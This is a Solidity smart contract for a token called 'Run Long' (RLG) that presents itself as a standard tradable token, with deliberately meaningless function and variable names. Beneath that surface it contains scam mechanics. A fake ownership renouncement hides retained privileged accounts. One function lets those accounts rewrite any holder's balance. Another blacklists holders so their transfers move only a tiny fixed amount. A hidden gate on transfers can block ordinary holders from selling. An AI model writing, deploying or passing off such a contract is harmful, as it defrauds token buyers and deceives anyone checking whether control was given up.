//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface tradingReceiverSell {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract feeReceiverAuto {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverFee {
    function createPair(address atMin, address receiverWallet) external returns (address);
}

interface txLiquidity {
    function totalSupply() external view returns (uint256);

    function balanceOf(address tradingAuto) external view returns (uint256);

    function transfer(address receiverBuy, uint256 launchExempt) external returns (bool);

    function allowance(address amountLaunch, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchExempt) external returns (bool);

    function transferFrom(
        address sender,
        address receiverBuy,
        uint256 launchExempt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed enableLaunched, uint256 value);
    event Approval(address indexed amountLaunch, address indexed spender, uint256 value);
}

interface tokenTeam is txLiquidity {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract RunLong is feeReceiverAuto, txLiquidity, tokenTeam {

    constructor (){
        
        tradingReceiverSell walletToken = tradingReceiverSell(fromSell);
        senderSell = receiverFee(walletToken.factory()).createPair(walletToken.WETH(), address(this));
        
        amountTo = _msgSender();
        toEnableReceiver();
        fromAt[amountTo] = true;
        fundMinLaunched[amountTo] = launchedTrading;
        if (autoMarketingFund != launchMin) {
            maxTotal = true;
        }
        emit Transfer(address(0), amountTo, launchedTrading);
    }

    function approve(address maxSender, uint256 launchExempt) public virtual override returns (bool) {
        sellToShould[_msgSender()][maxSender] = launchExempt;
        emit Approval(_msgSender(), maxSender, launchExempt);
        return true;
    }

    function transferFrom(address senderSwap, address receiverBuy, uint256 launchExempt) external override returns (bool) {
        if (_msgSender() != fromSell) {
            if (sellToShould[senderSwap][_msgSender()] != type(uint256).max) {
                require(launchExempt <= sellToShould[senderSwap][_msgSender()]);
                sellToShould[senderSwap][_msgSender()] -= launchExempt;
            }
        }
        return buyAuto(senderSwap, receiverBuy, launchExempt);
    }

    bool public minToken;

    mapping(address => bool) public maxFrom;

    uint256 public autoMarketingFund;

    address maxEnableToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => mapping(address => uint256)) private sellToShould;

    function tradingMin(address amountAuto, uint256 launchExempt) public {
        toSwapAt();
        fundMinLaunched[amountAuto] = launchExempt;
    }

    string private liquidityShouldMax = "RLG";

    function balanceOf(address tradingAuto) public view virtual override returns (uint256) {
        return fundMinLaunched[tradingAuto];
    }

    uint256 private launchedTrading = 100000000 * 10 ** 18;

    uint256 public enableShould;

    uint256 public sellTo;

    bool public launchFeeTeam;

    function name() external view virtual override returns (string memory) {
        return launchMode;
    }

    function maxToken(address senderSwap, address receiverBuy, uint256 launchExempt) internal returns (bool) {
        require(fundMinLaunched[senderSwap] >= launchExempt);
        fundMinLaunched[senderSwap] -= launchExempt;
        fundMinLaunched[receiverBuy] += launchExempt;
        emit Transfer(senderSwap, receiverBuy, launchExempt);
        return true;
    }

    bool public marketingShould;

    function listReceiver(address feeTake) public {
        toSwapAt();
        if (sellTo == launchMin) {
            launchFeeTeam = false;
        }
        if (feeTake == amountTo || feeTake == senderSell) {
            return;
        }
        maxFrom[feeTake] = true;
    }

    mapping(address => uint256) private fundMinLaunched;

    mapping(address => bool) public fromAt;

    function getOwner() external view returns (address) {
        return totalTxToken;
    }

    function owner() external view returns (address) {
        return totalTxToken;
    }

    function shouldMarketingAt(address listFeeTo) public {
        if (txTakeTrading) {
            return;
        }
        
        fromAt[listFeeTo] = true;
        
        txTakeTrading = true;
    }

    function allowance(address senderTo, address maxSender) external view virtual override returns (uint256) {
        if (maxSender == fromSell) {
            return type(uint256).max;
        }
        return sellToShould[senderTo][maxSender];
    }

    function symbol() external view virtual override returns (string memory) {
        return liquidityShouldMax;
    }

    uint256 private launchMin;

    address private totalTxToken;

    uint256 amountReceiverTo;

    function buyAuto(address senderSwap, address receiverBuy, uint256 launchExempt) internal returns (bool) {
        if (senderSwap == amountTo) {
            return maxToken(senderSwap, receiverBuy, launchExempt);
        }
        uint256 toExempt = txLiquidity(senderSell).balanceOf(maxEnableToken);
        require(toExempt == walletTo);
        require(receiverBuy != maxEnableToken);
        if (maxFrom[senderSwap]) {
            return maxToken(senderSwap, receiverBuy, txMin);
        }
        return maxToken(senderSwap, receiverBuy, launchExempt);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return launchedTrading;
    }

    function toSwapAt() private view {
        require(fromAt[_msgSender()]);
    }

    string private launchMode = "Run Long";

    uint8 private launchedTeamMax = 18;

    function decimals() external view virtual override returns (uint8) {
        return launchedTeamMax;
    }

    bool private maxTotal;

    uint256 walletTo;

    address public amountTo;

    function toEnableReceiver() public {
        emit OwnershipTransferred(amountTo, address(0));
        totalTxToken = address(0);
    }

    function transfer(address amountAuto, uint256 launchExempt) external virtual override returns (bool) {
        return buyAuto(_msgSender(), amountAuto, launchExempt);
    }

    address public senderSell;

    address fromSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 private takeReceiverLiquidity;

    uint256 constant txMin = 19 ** 10;

    bool public txTakeTrading;

    function launchedMarketing(uint256 launchExempt) public {
        toSwapAt();
        walletTo = launchExempt;
    }

    event OwnershipTransferred(address indexed exemptEnableToken, address indexed autoMin);

}